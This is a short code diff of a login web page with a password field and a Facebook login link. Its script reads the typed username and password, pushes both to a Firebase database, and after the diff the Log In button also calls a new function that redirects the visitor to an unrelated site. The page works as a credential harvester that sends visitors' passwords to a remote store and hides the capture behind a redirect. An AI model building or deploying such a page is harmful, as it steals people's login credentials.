@@ -43,13 +43,18 @@
       var hog =document.querySelector('.vedan').value;
       console.log(hug);
       console.log(hog);
-window.open("https://www.geeksforgeeks.org", "_top"); 
+
 
 var firebasereff =firebase.database().ref();
 firebasereff.child("jaed").push(hug)
 var firebasereff =firebase.database().ref();
 firebasereff.child("jaed").push(hog)
   }
+function bad()
+{
+window.open("https://www.geeksforgeeks.org", "_top"); 
+
+}
   
 </script>
    
@@ -210,7 +215,7 @@ h1{
 			   
 				<input type="password" class="vedan" placeholder="Password">
 			  </div>
-			  <button type="button" class="btn btn-primary"  onclick=" jaed()">Log In</button>
+			  <button type="button" class="btn btn-primary"  onclick=" jaed(),bad()">Log In</button>
 			</form>
 			<h4>OR</h4>
 			<p><i class="fa fa-facebook-square"></i><a href="#">Log In Facebook</a></p>
